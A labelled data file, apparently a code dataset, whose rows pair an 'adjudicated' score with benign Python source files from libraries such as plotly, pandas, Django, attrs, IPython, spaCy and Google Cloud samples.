""""""<<NEWL>>    Ensure entry points are unique by group and name and validate each.<<NEWL>>    """"""<<NEWL>>    consume(map(ensure_valid, ensure_unique(eps, key=by_group_and_name)))<<NEWL>>    return eps<<NEWL>><<NEWL>><<NEWL>>@functools.singledispatch<<NEWL>>def load(eps):<<NEWL>>    """"""<<NEWL>>    Given a Distribution.entry_points, produce EntryPoints.<<NEWL>>    """"""<<NEWL>>    groups = itertools.chain.from_iterable(<<NEWL>>        load_group(value, group)<<NEWL>>        for group, value in eps.items())<<NEWL>>    return validate(metadata.EntryPoints(groups))<<NEWL>><<NEWL>><<NEWL>>@load.register(str)<<NEWL>>def _(eps):<<NEWL>>    r""""""<<NEWL>>    >>> ep, = load('[console_scripts]\nfoo=bar')<<NEWL>>    >>> ep.group<<NEWL>>    'console_scripts'<<NEWL>>    >>> ep.name<<NEWL>>    'foo'<<NEWL>>    >>> ep.value<<NEWL>>    'bar'<<NEWL>>    """"""<<NEWL>>    return validate(metadata.EntryPoints(metadata.EntryPoints._from_text(eps)))<<NEWL>><<NEWL>><<NEWL>>load.register(type(None), lambda x: x)<<NEWL>><<NEWL>><<NEWL>>@pass_none<<NEWL>>def render(eps: metadata.EntryPoints):<<NEWL>>    by_group = operator.attrgetter('group')<<NEWL>>    groups = itertools.groupby(sorted(eps, key=by_group), by_group)<<NEWL>><<NEWL>>    return '\n'.join(<<NEWL>>        f'[{group}]\n{render_items(items)}\n'<<NEWL>>        for group, items in groups<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def render_items(eps):<<NEWL>>    return '\n'.join(<<NEWL>>        f'{ep.name} = {ep.value}'<<NEWL>>        for ep in sorted(eps)<<NEWL>>    )"
275	adjudicated	1	"import pytest<<NEWL>>from traitlets import HasTraits, TraitError<<NEWL>>from traitlets.utils.importstring import import_item<<NEWL>><<NEWL>>from notebook.traittypes import (<<NEWL>>    InstanceFromClasses,<<NEWL>>    TypeFromClasses<<NEWL>>)<<NEWL>>from notebook.services.contents.largefilemanager import LargeFileManager<<NEWL>><<NEWL>><<NEWL>>class DummyClass:<<NEWL>>    """"""Dummy class for testing Instance""""""<<NEWL>><<NEWL>><<NEWL>>class DummyInt(int):<<NEWL>>    """"""Dummy class for testing types.""""""<<NEWL>><<NEWL>><<NEWL>>class Thing(HasTraits):<<NEWL>><<NEWL>>    a = InstanceFromClasses(<<NEWL>>        default_value=2,<<NEWL>>        klasses=[<<NEWL>>            int,<<NEWL>>            str,<<NEWL>>            DummyClass,<<NEWL>>        ]<<NEWL>>    )<<NEWL>><<NEWL>>    b = TypeFromClasses(<<NEWL>>        default_value=None,<<NEWL>>        allow_none=True,<<NEWL>>        klasses=[<<NEWL>>            DummyClass,<<NEWL>>            int,<<NEWL>>            'notebook.services.contents.manager.ContentsManager'<<NEWL>>        ]<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class TestInstanceFromClasses:<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [1, 'test', DummyClass()]<<NEWL>>    )<<NEWL>>    def test_good_values(self, value):<<NEWL>>        thing = Thing(a=value)<<NEWL>>        assert thing.a == value<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [2.4, object()]<<NEWL>>    )<<NEWL>>    def test_bad_values(self, value):<<NEWL>>        with pytest.raises(TraitError) as e:<<NEWL>>            thing = Thing(a=value)<<NEWL>><<NEWL>><<NEWL>>class TestTypeFromClasses:<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [DummyClass, DummyInt, LargeFileManager,<<NEWL>>            'notebook.services.contents.manager.ContentsManager']<<NEWL>>    )<<NEWL>>    def test_good_values(self, value):<<NEWL>>        thing = Thing(b=value)<<NEWL>>        if isinstance(value, str):<<NEWL>>            value = import_item(value)<<NEWL>>        assert thing.b == value<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [float, object]<<NEWL>>    )<<NEWL>>    def test_bad_values(self, value):<<NEWL>>        with pytest.raises(TraitError) as e:<<NEWL>>            thing = Thing(b=value)"
57	adjudicated	3	"# Copyright 2016 Google Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>""""""<<NEWL>>Sample Google App Engine application that demonstrates using the Users API<<NEWL>><<NEWL>>For more information about App Engine, see README.md under /appengine.<<NEWL>>""""""<<NEWL>><<NEWL>># [START all]<<NEWL>><<NEWL>>from google.appengine.api import users<<NEWL>>import webapp2<<NEWL>><<NEWL>><<NEWL>>class MainPage(webapp2.RequestHandler):<<NEWL>>    def get(self):<<NEWL>>        # [START user_details]<<NEWL>>        user = users.get_current_user()<<NEWL>>        if user:<<NEWL>>            nickname = user.nickname()<<NEWL>>            logout_url = users.create_logout_url('/')<<NEWL>>            greeting = 'Welcome, {}! (<a href=""{}"">sign out</a>)'.format(<<NEWL>>                nickname, logout_url)<<NEWL>>        else:<<NEWL>>            login_url = users.create_login_url('/')<<NEWL>>            greeting = '<a href=""{}"">Sign in</a>'.format(login_url)<<NEWL>>        # [END user_details]<<NEWL>>        self.response.write(<<NEWL>>            '<html><body>{}</body></html>'.format(greeting))<<NEWL>><<NEWL>><<NEWL>>class AdminPage(webapp2.RequestHandler):<<NEWL>>    def get(self):<<NEWL>>        user = users.get_current_user()<<NEWL>>        if user:<<NEWL>>            if users.is_current_user_admin():<<NEWL>>                self.response.write('You are an administrator.')<<NEWL>>            else:<<NEWL>>                self.response.write('You are not an administrator.')<<NEWL>>        else:<<NEWL>>            self.response.write('You are not logged in.')<<NEWL>><<NEWL>><<NEWL>>app = webapp2.WSGIApplication([<<NEWL>>    ('/', MainPage),<<NEWL>>    ('/admin', AdminPage)<<NEWL>>], debug=True)<<NEWL>><<NEWL>># [END all]"
117	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class LineValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""line"", parent_name=""scatterternary"", **kwargs):<<NEWL>>        super(LineValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Line""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            backoff<<NEWL>>                Sets the line back off from the end point of<<NEWL>>                the nth line segment (in px). This option is<<NEWL>>                useful e.g. to avoid overlap with arrowhead<<NEWL>>                markers. With ""auto"" the lines would trim<<NEWL>>                before markers if `marker.angleref` is set to<<NEWL>>                ""previous"".<<NEWL>>            backoffsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `backoff`.<<NEWL>>            color<<NEWL>>                Sets the line color.<<NEWL>>            dash<<NEWL>>                Sets the dash style of lines. Set to a dash<<NEWL>>                type string (""solid"", ""dot"", ""dash"",<<NEWL>>                ""longdash"", ""dashdot"", or ""longdashdot"") or a<<NEWL>>                dash length list in px (eg ""5px,10px,2px,2px"").<<NEWL>>            shape<<NEWL>>                Determines the line shape. With ""spline"" the<<NEWL>>                lines are drawn using spline interpolation. The<<NEWL>>                other available values correspond to step-wise<<NEWL>>                line shapes.<<NEWL>>            smoothing<<NEWL>>                Has an effect only if `shape` is set to<<NEWL>>                ""spline"" Sets the amount of smoothing. 0<<NEWL>>                corresponds to no smoothing (equivalent to a<<NEWL>>                ""linear"" shape).<<NEWL>>            width<<NEWL>>                Sets the line width (in px).<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
286	adjudicated	4	"""""""<<NEWL>>Behavioral based tests for offsets and date_range.<<NEWL>><<NEWL>>This file is adapted from https://github.com/pandas-dev/pandas/pull/18761 -<<NEWL>>which was more ambitious but less idiomatic in its use of Hypothesis.<<NEWL>><<NEWL>>You may wish to consult the previous version for inspiration on further<<NEWL>>tests, or when trying to pin down the bugs exposed by the tests below.<<NEWL>>""""""<<NEWL>>from hypothesis import (<<NEWL>>    assume,<<NEWL>>    given,<<NEWL>>)<<NEWL>>import pytest<<NEWL>>import pytz<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>from pandas._testing._hypothesis import (<<NEWL>>    DATETIME_JAN_1_1900_OPTIONAL_TZ,<<NEWL>>    YQM_OFFSET,<<NEWL>>)<<NEWL>><<NEWL>># ----------------------------------------------------------------<<NEWL>># Offset-specific behaviour tests<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.arm_slow<<NEWL>>@given(DATETIME_JAN_1_1900_OPTIONAL_TZ, YQM_OFFSET)<<NEWL>>def test_on_offset_implementations(dt, offset):<<NEWL>>    assume(not offset.normalize)<<NEWL>>    # check that the class-specific implementations of is_on_offset match<<NEWL>>    # the general case definition:<<NEWL>>    #   (dt + offset) - offset == dt<<NEWL>>    try:<<NEWL>>        compare = (dt + offset) - offset<<NEWL>>    except (pytz.NonExistentTimeError, pytz.AmbiguousTimeError):<<NEWL>>        # When dt + offset does not exist or is DST-ambiguous, assume(False) to<<NEWL>>        # indicate to hypothesis that this is not a valid test case<<NEWL>>        # DST-ambiguous example (GH41906):<<NEWL>>        # dt = datetime.datetime(1900, 1, 1, tzinfo=pytz.timezone('Africa/Kinshasa'))<<NEWL>>        # offset = MonthBegin(66)<<NEWL>>        assume(False)<<NEWL>><<NEWL>>    assert offset.is_on_offset(dt) == (compare == dt)<<NEWL>><<NEWL>><<NEWL>>@given(YQM_OFFSET)<<NEWL>>def test_shift_across_dst(offset):<<NEWL>>    # GH#18319 check that 1) timezone is correctly normalized and<<NEWL>>    # 2) that hour is not incorrectly changed by this normalization<<NEWL>>    assume(not offset.normalize)<<NEWL>><<NEWL>>    # Note that dti includes a transition across DST boundary<<NEWL>>    dti = pd.date_range(<<NEWL>>        start=""2017-10-30 12:00:00"", end=""2017-11-06"", freq=""D"", tz=""US/Eastern""<<NEWL>>    )<<NEWL>>    assert (dti.hour == 12).all()  # we haven't screwed up yet<<NEWL>><<NEWL>>    res = dti + offset<<NEWL>>    assert (res.hour == 12).all()"
6	adjudicated	0	"import sys<<NEWL>>from typing import TYPE_CHECKING<<NEWL>><<NEWL>>if sys.version_info < (3, 7) or TYPE_CHECKING:<<NEWL>>    from ._ysrc import YsrcValidator<<NEWL>>    from ._y import YValidator<<NEWL>>    from ._xsrc import XsrcValidator<<NEWL>>    from ._x import XValidator<<NEWL>>    from ._thickness import ThicknessValidator<<NEWL>>    from ._pad import PadValidator<<NEWL>>    from ._line import LineValidator<<NEWL>>    from ._labelsrc import LabelsrcValidator<<NEWL>>    from ._label import LabelValidator<<NEWL>>    from ._hovertemplatesrc import HovertemplatesrcValidator<<NEWL>>    from ._hovertemplate import HovertemplateValidator<<NEWL>>    from ._hoverlabel import HoverlabelValidator<<NEWL>>    from ._hoverinfo import HoverinfoValidator<<NEWL>>    from ._groups import GroupsValidator<<NEWL>>    from ._customdatasrc import CustomdatasrcValidator<<NEWL>>    from ._customdata import CustomdataValidator<<NEWL>>    from ._colorsrc import ColorsrcValidator<<NEWL>>    from ._color import ColorValidator<<NEWL>>else:<<NEWL>>    from _plotly_utils.importers import relative_import<<NEWL>><<NEWL>>    __all__, __getattr__, __dir__ = relative_import(<<NEWL>>        __name__,<<NEWL>>        [],<<NEWL>>        [<<NEWL>>            ""._ysrc.YsrcValidator"",<<NEWL>>            ""._y.YValidator"",<<NEWL>>            ""._xsrc.XsrcValidator"",<<NEWL>>            ""._x.XValidator"",<<NEWL>>            ""._thickness.ThicknessValidator"",<<NEWL>>            ""._pad.PadValidator"",<<NEWL>>            ""._line.LineValidator"",<<NEWL>>            ""._labelsrc.LabelsrcValidator"",<<NEWL>>            ""._label.LabelValidator"",<<NEWL>>            ""._hovertemplatesrc.HovertemplatesrcValidator"",<<NEWL>>            ""._hovertemplate.HovertemplateValidator"",<<NEWL>>            ""._hoverlabel.HoverlabelValidator"",<<NEWL>>            ""._hoverinfo.HoverinfoValidator"",<<NEWL>>            ""._groups.GroupsValidator"",<<NEWL>>            ""._customdatasrc.CustomdatasrcValidator"",<<NEWL>>            ""._customdata.CustomdataValidator"",<<NEWL>>            ""._colorsrc.ColorsrcValidator"",<<NEWL>>            ""._color.ColorValidator"",<<NEWL>>        ],<<NEWL>>    )"
397	adjudicated	2	"import tempfile, os<<NEWL>>from pathlib import Path<<NEWL>><<NEWL>>from traitlets.config.loader import Config<<NEWL>><<NEWL>><<NEWL>>def setup_module():<<NEWL>>    ip.magic('load_ext storemagic')<<NEWL>><<NEWL>>def test_store_restore():<<NEWL>>    assert 'bar' not in ip.user_ns, ""Error: some other test leaked `bar` in user_ns""<<NEWL>>    assert 'foo' not in ip.user_ns, ""Error: some other test leaked `foo` in user_ns""<<NEWL>>    assert 'foobar' not in ip.user_ns, ""Error: some other test leaked `foobar` in user_ns""<<NEWL>>    assert 'foobaz' not in ip.user_ns, ""Error: some other test leaked `foobaz` in user_ns""<<NEWL>>    ip.user_ns['foo'] = 78<<NEWL>>    ip.magic('alias bar echo ""hello""')<<NEWL>>    ip.user_ns['foobar'] = 79<<NEWL>>    ip.user_ns['foobaz'] = '80'<<NEWL>>    tmpd = tempfile.mkdtemp()<<NEWL>>    ip.magic('cd ' + tmpd)<<NEWL>>    ip.magic('store foo')<<NEWL>>    ip.magic('store bar')<<NEWL>>    ip.magic('store foobar foobaz')<<NEWL>><<NEWL>>    # Check storing<<NEWL>>    assert ip.db[""autorestore/foo""] == 78<<NEWL>>    assert ""bar"" in ip.db[""stored_aliases""]<<NEWL>>    assert ip.db[""autorestore/foobar""] == 79<<NEWL>>    assert ip.db[""autorestore/foobaz""] == ""80""<<NEWL>><<NEWL>>    # Remove those items<<NEWL>>    ip.user_ns.pop('foo', None)<<NEWL>>    ip.user_ns.pop('foobar', None)<<NEWL>>    ip.user_ns.pop('foobaz', None)<<NEWL>>    ip.alias_manager.undefine_alias('bar')<<NEWL>>    ip.magic('cd -')<<NEWL>>    ip.user_ns['_dh'][:] = []<<NEWL>><<NEWL>>    # Check restoring<<NEWL>>    ip.magic(""store -r foo bar foobar foobaz"")<<NEWL>>    assert ip.user_ns[""foo""] == 78<<NEWL>>    assert ip.alias_manager.is_alias(""bar"")<<NEWL>>    assert ip.user_ns[""foobar""] == 79<<NEWL>>    assert ip.user_ns[""foobaz""] == ""80""<<NEWL>><<NEWL>>    ip.magic(""store -r"")  # restores _dh too<<NEWL>>    assert any(Path(tmpd).samefile(p) for p in ip.user_ns[""_dh""])<<NEWL>><<NEWL>>    os.rmdir(tmpd)<<NEWL>><<NEWL>>def test_autorestore():<<NEWL>>    ip.user_ns['foo'] = 95<<NEWL>>    ip.magic('store foo')<<NEWL>>    del ip.user_ns['foo']<<NEWL>>    c = Config()<<NEWL>>    c.StoreMagics.autorestore = False<<NEWL>>    orig_config = ip.config<<NEWL>>    try:<<NEWL>>        ip.config = c<<NEWL>>        ip.extension_manager.reload_extension(""storemagic"")<<NEWL>>        assert ""foo"" not in ip.user_ns<<NEWL>>        c.StoreMagics.autorestore = True<<NEWL>>        ip.extension_manager.reload_extension(""storemagic"")<<NEWL>>        assert ip.user_ns[""foo""] == 95<<NEWL>>    finally:<<NEWL>>        ip.config = orig_config"
146	adjudicated	3	"""""""<<NEWL>>Simple console example that echos the input converted to uppercase.<<NEWL>>""""""<<NEWL>><<NEWL>>import sys<<NEWL>>import asyncio<<NEWL>><<NEWL>>from typing import Callable<<NEWL>><<NEWL>>from bacpypes3.settings import settings<<NEWL>>from bacpypes3.debugging import bacpypes_debugging, ModuleLogger<<NEWL>>from bacpypes3.argparse import ArgumentParser<<NEWL>>from bacpypes3.console import Console, ConsolePDU<<NEWL>>from bacpypes3.comm import Server, bind<<NEWL>><<NEWL>># some debugging<<NEWL>>_debug = 0<<NEWL>>_log = ModuleLogger(globals())<<NEWL>><<NEWL>><<NEWL>>@bacpypes_debugging<<NEWL>>class Echo(Server[ConsolePDU]):<<NEWL>>    """"""<<NEWL>>    This example server echos downstream strings as uppercase strings going<<NEWL>>    upstream.  If the PDU is None the console is finished, and this could send<<NEWL>>    an integer status code upstream to exit.<<NEWL>>    """"""<<NEWL>><<NEWL>>    _debug: Callable[..., None]<<NEWL>><<NEWL>>    async def indication(self, pdu: ConsolePDU) -> None:<<NEWL>>        """"""<<NEWL>>        This function is called with each line of text from the console (or<<NEWL>>        from a file or pipe) and called with None at end-of-file.  It is<<NEWL>>        ""downstream"" of the Console() instance and gets this ""indication"" when<<NEWL>>        the console is making a ""request"".<<NEWL>>        """"""<<NEWL>>        if _debug:<<NEWL>>            Echo._debug(""indication {!r}"".format(pdu))<<NEWL>>        if pdu is None:<<NEWL>>            return<<NEWL>><<NEWL>>        # send the uppercase content back up the stack<<NEWL>>        await self.response(pdu.upper())<<NEWL>><<NEWL>><<NEWL>>async def main() -> None:<<NEWL>>    try:<<NEWL>>        console = None<<NEWL>>        args = ArgumentParser().parse_args()<<NEWL>>        if _debug:<<NEWL>>            _log.debug(""args: %r"", args)<<NEWL>>            _log.debug(""settings: %r"", settings)<<NEWL>><<NEWL>>        # build a very small stack<<NEWL>>        console = Console()<<NEWL>>        echo = Echo()<<NEWL>>        if _debug:<<NEWL>>            _log.debug(""console, echo: %r, %r"", console, echo)<<NEWL>><<NEWL>>        # bind the two objects together, top down<<NEWL>>        bind(console, echo)<<NEWL>><<NEWL>>        # run until the console is done, canceled or EOF<<NEWL>>        await console.fini.wait()<<NEWL>><<NEWL>>    finally:<<NEWL>>        if console and console.exit_status:<<NEWL>>            sys.exit(console.exit_status)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    asyncio.run(main())"
488	adjudicated	0	"# coding: utf8<<NEWL>>from __future__ import unicode_literals<<NEWL>><<NEWL>>from ...attrs import LIKE_NUM<<NEWL>><<NEWL>><<NEWL>>_num_words = [<<NEWL>>    ""zero"",<<NEWL>>    ""um"",<<NEWL>>    ""dois"",<<NEWL>>    ""três"",<<NEWL>>    ""tres"",<<NEWL>>    ""quatro"",<<NEWL>>    ""cinco"",<<NEWL>>    ""seis"",<<NEWL>>    ""sete"",<<NEWL>>    ""oito"",<<NEWL>>    ""nove"",<<NEWL>>    ""dez"",<<NEWL>>    ""onze"",<<NEWL>>    ""doze"",<<NEWL>>    ""dúzia"",<<NEWL>>    ""dúzias"",<<NEWL>>    ""duzia"",<<NEWL>>    ""duzias"",<<NEWL>>    ""treze"",<<NEWL>>    ""catorze"",<<NEWL>>    ""quinze"",<<NEWL>>    ""dezasseis"",<<NEWL>>    ""dezassete"",<<NEWL>>    ""dezoito"",<<NEWL>>    ""dezanove"",<<NEWL>>    ""vinte"",<<NEWL>>    ""trinta"",<<NEWL>>    ""quarenta"",<<NEWL>>    ""cinquenta"",<<NEWL>>    ""sessenta"",<<NEWL>>    ""setenta"",<<NEWL>>    ""oitenta"",<<NEWL>>    ""noventa"",<<NEWL>>    ""cem"",<<NEWL>>    ""cento"",<<NEWL>>    ""duzentos"",<<NEWL>>    ""trezentos"",<<NEWL>>    ""quatrocentos"",<<NEWL>>    ""quinhentos"",<<NEWL>>    ""seicentos"",<<NEWL>>    ""setecentos"",<<NEWL>>    ""oitocentos"",<<NEWL>>    ""novecentos"",<<NEWL>>    ""mil"",<<NEWL>>    ""milhão"",<<NEWL>>    ""milhao"",<<NEWL>>    ""milhões"",<<NEWL>>    ""milhoes"",<<NEWL>>    ""bilhão"",<<NEWL>>    ""bilhao"",<<NEWL>>    ""bilhões"",<<NEWL>>    ""bilhoes"",<<NEWL>>    ""trilhão"",<<NEWL>>    ""trilhao"",<<NEWL>>    ""trilhões"",<<NEWL>>    ""trilhoes"",<<NEWL>>    ""quadrilhão"",<<NEWL>>    ""quadrilhao"",<<NEWL>>    ""quadrilhões"",<<NEWL>>    ""quadrilhoes"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>_ordinal_words = [<<NEWL>>    ""primeiro"",<<NEWL>>    ""segundo"",<<NEWL>>    ""terceiro"",<<NEWL>>    ""quarto"",<<NEWL>>    ""quinto"",<<NEWL>>    ""sexto"",<<NEWL>>    ""sétimo"",<<NEWL>>    ""oitavo"",<<NEWL>>    ""nono"",<<NEWL>>    ""décimo"",<<NEWL>>    ""vigésimo"",<<NEWL>>    ""trigésimo"",<<NEWL>>    ""quadragésimo"",<<NEWL>>    ""quinquagésimo"",<<NEWL>>    ""sexagésimo"",<<NEWL>>    ""septuagésimo"",<<NEWL>>    ""octogésimo"",<<NEWL>>    ""nonagésimo"",<<NEWL>>    ""centésimo"",<<NEWL>>    ""ducentésimo"",<<NEWL>>    ""trecentésimo"",<<NEWL>>    ""quadringentésimo"",<<NEWL>>    ""quingentésimo"",<<NEWL>>    ""sexcentésimo"",<<NEWL>>    ""septingentésimo"",<<NEWL>>    ""octingentésimo"",<<NEWL>>    ""nongentésimo"",<<NEWL>>    ""milésimo"",<<NEWL>>    ""milionésimo"",<<NEWL>>    ""bilionésimo"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>def like_num(text):<<NEWL>>    if text.startswith((""+"", ""-"", ""±"", ""~"")):<<NEWL>>        text = text[1:]<<NEWL>>    text = text.replace("","", """").replace(""."", """").replace(""º"", """").replace(""ª"", """")<<NEWL>>    if text.isdigit():<<NEWL>>        return True<<NEWL>>    if text.count(""/"") == 1:<<NEWL>>        num, denom = text.split(""/"")<<NEWL>>        if num.isdigit() and denom.isdigit():<<NEWL>>            return True<<NEWL>>    if text.lower() in _num_words:<<NEWL>>        return True<<NEWL>>    if text.lower() in _ordinal_words:<<NEWL>>        return True<<NEWL>>    return False<<NEWL>><<NEWL>><<NEWL>>LEX_ATTRS = {LIKE_NUM: like_num}"
498	adjudicated	2	"from django.conf import settings<<NEWL>>from django.core import checks<<NEWL>>from django.core.exceptions import FieldDoesNotExist<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class CurrentSiteManager(models.Manager):<<NEWL>>    ""Use this to limit objects to those associated with the current site.""<<NEWL>><<NEWL>>    use_in_migrations = True<<NEWL>><<NEWL>>    def __init__(self, field_name=None):<<NEWL>>        super().__init__()<<NEWL>>        self.__field_name = field_name<<NEWL>><<NEWL>>    def check(self, **kwargs):<<NEWL>>        errors = super().check(**kwargs)<<NEWL>>        errors.extend(self._check_field_name())<<NEWL>>        return errors<<NEWL>><<NEWL>>    def _check_field_name(self):<<NEWL>>        field_name = self._get_field_name()<<NEWL>>        try:<<NEWL>>            field = self.model._meta.get_field(field_name)<<NEWL>>        except FieldDoesNotExist:<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager could not find a field named '%s'."" % field_name,<<NEWL>>                    obj=self,<<NEWL>>                    id='sites.E001',<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key or a many-to-many field."" % (<<NEWL>>                        self.model._meta.object_name, field_name<<NEWL>>                    ),<<NEWL>>                    obj=self,<<NEWL>>                    id='sites.E002',<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        return []<<NEWL>><<NEWL>>    def _get_field_name(self):<<NEWL>>        """""" Return self.__field_name or 'site' or 'sites'. """"""<<NEWL>><<NEWL>>        if not self.__field_name:<<NEWL>>            try:<<NEWL>>                self.model._meta.get_field('site')<<NEWL>>            except FieldDoesNotExist:<<NEWL>>                self.__field_name = 'sites'<<NEWL>>            else:<<NEWL>>                self.__field_name = 'site'<<NEWL>>        return self.__field_name<<NEWL>><<NEWL>>    def get_queryset(self):<<NEWL>>        return super().get_queryset().filter(**{self._get_field_name() + '__id': settings.SITE_ID})"
156	adjudicated	3	"# SPDX-License-Identifier: MIT<<NEWL>><<NEWL>><<NEWL>>class FrozenError(AttributeError):<<NEWL>>    """"""<<NEWL>>    A frozen/immutable instance or attribute have been attempted to be<<NEWL>>    modified.<<NEWL>><<NEWL>>    It mirrors the behavior of ``namedtuples`` by using the same error message<<NEWL>>    and subclassing `AttributeError`.<<NEWL>><<NEWL>>    .. versionadded:: 20.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    msg = ""can't set attribute""<<NEWL>>    args = [msg]<<NEWL>><<NEWL>><<NEWL>>class FrozenInstanceError(FrozenError):<<NEWL>>    """"""<<NEWL>>    A frozen instance has been attempted to be modified.<<NEWL>><<NEWL>>    .. versionadded:: 16.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class FrozenAttributeError(FrozenError):<<NEWL>>    """"""<<NEWL>>    A frozen attribute has been attempted to be modified.<<NEWL>><<NEWL>>    .. versionadded:: 20.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class AttrsAttributeNotFoundError(ValueError):<<NEWL>>    """"""<<NEWL>>    An ``attrs`` function couldn't find an attribute that the user asked for.<<NEWL>><<NEWL>>    .. versionadded:: 16.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class NotAnAttrsClassError(ValueError):<<NEWL>>    """"""<<NEWL>>    A non-``attrs`` class has been passed into an ``attrs`` function.<<NEWL>><<NEWL>>    .. versionadded:: 16.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class DefaultAlreadySetError(RuntimeError):<<NEWL>>    """"""<<NEWL>>    A default has been set using ``attr.ib()`` and is attempted to be reset<<NEWL>>    using the decorator.<<NEWL>><<NEWL>>    .. versionadded:: 17.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class UnannotatedAttributeError(RuntimeError):<<NEWL>>    """"""<<NEWL>>    A class with ``auto_attribs=True`` has an ``attr.ib()`` without a type<<NEWL>>    annotation.<<NEWL>><<NEWL>>    .. versionadded:: 17.3.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class PythonTooOldError(RuntimeError):<<NEWL>>    """"""<<NEWL>>    It was attempted to use an ``attrs`` feature that requires a newer Python<<NEWL>>    version.<<NEWL>><<NEWL>>    .. versionadded:: 18.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class NotCallableError(TypeError):<<NEWL>>    """"""<<NEWL>>    A ``attr.ib()`` requiring a callable has been set with a value<<NEWL>>    that is not callable.<<NEWL>><<NEWL>>    .. versionadded:: 19.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, msg, value):<<NEWL>>        super(TypeError, self).__init__(msg, value)<<NEWL>>        self.msg = msg<<NEWL>>        self.value = value<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return str(self.msg)"
387	adjudicated	2	"# Copyright 2022 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>><<NEWL>># [START speech_quickstart_v2]<<NEWL>>import io<<NEWL>><<NEWL>>from google.cloud.speech_v2 import SpeechClient<<NEWL>>from google.cloud.speech_v2.types import cloud_speech<<NEWL>><<NEWL>><<NEWL>>def quickstart_v2(project_id, recognizer_id, audio_file):<<NEWL>>    # Instantiates a client<<NEWL>>    client = SpeechClient()<<NEWL>><<NEWL>>    request = cloud_speech.CreateRecognizerRequest(<<NEWL>>        parent=f""projects/{project_id}/locations/global"",<<NEWL>>        recognizer_id=recognizer_id,<<NEWL>>        recognizer=cloud_speech.Recognizer(<<NEWL>>            language_codes=[""en-US""], model=""latest_long""<<NEWL>>        ),<<NEWL>>    )<<NEWL>><<NEWL>>    # Creates a Recognizer<<NEWL>>    operation = client.create_recognizer(request=request)<<NEWL>>    recognizer = operation.result()<<NEWL>><<NEWL>>    # Reads a file as bytes<<NEWL>>    with io.open(audio_file, ""rb"") as f:<<NEWL>>        content = f.read()<<NEWL>><<NEWL>>    config = cloud_speech.RecognitionConfig(auto_decoding_config={})<<NEWL>><<NEWL>>    request = cloud_speech.RecognizeRequest(<<NEWL>>        recognizer=recognizer.name, config=config, content=content<<NEWL>>    )<<NEWL>><<NEWL>>    # Transcribes the audio into text<<NEWL>>    response = client.recognize(request=request)<<NEWL>><<NEWL>>    for result in response.results:<<NEWL>>        print(""Transcript: {}"".format(result.alternatives[0].transcript))<<NEWL>><<NEWL>>    return response<<NEWL>><<NEWL>><<NEWL>># [END speech_quickstart_v2]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    quickstart_v2()"
